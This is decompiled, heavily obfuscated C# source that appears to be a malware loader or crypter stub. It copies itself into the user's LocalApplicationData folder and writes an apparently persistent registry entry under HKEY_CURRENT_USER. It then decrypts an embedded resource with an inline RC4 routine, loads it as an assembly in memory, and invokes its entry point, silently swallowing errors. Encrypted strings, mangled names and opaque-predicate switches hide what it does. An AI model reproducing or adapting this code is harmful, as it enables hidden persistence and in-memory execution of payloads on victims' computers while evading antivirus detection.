using System;
using System.Reflection;
using System.Resources;
using Microsoft.Win32;

namespace ns0;

internal sealed class Class0
{
	private static void Main(string[] args)
	{
		Class1.Class2.Class3.smethod_2();
		object[] object_ = new object[0];
		Class1.Class2.smethod_3(new Random(), 300, 750, 532, 578);
		long num = Class1.Class2.smethod_4(377, 329);
		_ = Class1.Class2.smethod_4(495, 479) - num;
		if (!Class1.Class2.smethod_5(Class1.Class2.Class4.smethod_0(smethod_2(Environment.SpecialFolder.LocalApplicationData, 944, 943), Class1.Class2.smethod_2(462928215, 0), 341, 377), 10, 26))
		{
			Class1.Class2.Class4.smethod_1(smethod_3(1012, 958), Class1.Class2.Class4.smethod_0(smethod_2(Environment.SpecialFolder.LocalApplicationData, 807, 824), Class1.Class2.smethod_2(462928223, 8), 526, 546), 533, 608);
		}
		string string_ = smethod_0(Class1.Class2.smethod_2(462928198, 4));
		RegistryKey registryKey_ = smethod_4(Registry.CurrentUser, string_, bool_0: true, 352, 369);
		Class1.Class2.Class3.smethod_0(registryKey_, Class1.Class2.smethod_2(462928144, 2), Class1.Class2.Class4.smethod_0(smethod_2(Environment.SpecialFolder.LocalApplicationData, 267, 276), Class1.Class2.smethod_2(462928210, 5), 554, 518), 210, 170);
		Class1.Class2.smethod_6(registryKey_, 533, 519);
		try
		{
			ResourceManager resourceManager_ = new ResourceManager(Class1.Class2.smethod_2(462928128, 3), Class5.Class6.smethod_0(242, 170));
			byte[] byte_ = smethod_1((byte[])Class5.Class6.smethod_1(resourceManager_, Class1.Class2.smethod_2(462928139, 6), 60, 114), Class1.Class2.smethod_2(462928190, 4));
			Class5.smethod_0(resourceManager_, 870, 847);
			Assembly assembly_ = Class5.smethod_1(byte_, 21, 65);
			if (Class5.Class8.smethod_2(Class5.smethod_2(assembly_, 96, 67), 326, 319).Length > 0)
			{
				object_ = new object[1] { args };
			}
			Class5.Class8.smethod_13(Class5.Class6.Class7.smethod_8(assembly_, 566, 537), null, object_, 882, 870);
		}
		catch
		{
		}
	}

	private static string smethod_0(string string_0)
	{
		char[] array = Class1.smethod_0(string_0, 433, 410);
		Class1.Class2.Class3.smethod_1(array, 876, 783);
		return new string(array);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0)
	{
		byte[] array = Class1.smethod_2(Class1.smethod_1(563, 523), string_0, 696, 702);
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class1.smethod_3(array, 0, 727, 650)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class10.smethod_0(byte_0, 0, 165, 156); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}

	static Class0()
	{
		Class1.Class2.Class3.smethod_2();
	}

	internal static string smethod_2(Environment.SpecialFolder specialFolder_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 31:
				return Class5.Class6.smethod_4(specialFolder_0, 910, 961);
			}
		}
	}

	internal static string smethod_3(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 74:
				return Class5.Class8.smethod_3(730, 649);
			}
		}
	}

	internal static RegistryKey smethod_4(RegistryKey registryKey_0, string string_0, bool bool_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 17:
				return Class5.Class6.smethod_5(registryKey_0, string_0, bool_0, 85, 31);
			}
		}
	}

	internal static Assembly smethod_5(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 122:
				return Class5.Class6.smethod_0(420, 508);
			}
		}
	}

	internal static AppDomain smethod_6(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 79:
				return Class5.smethod_3(629, 534);
			}
		}
	}
}
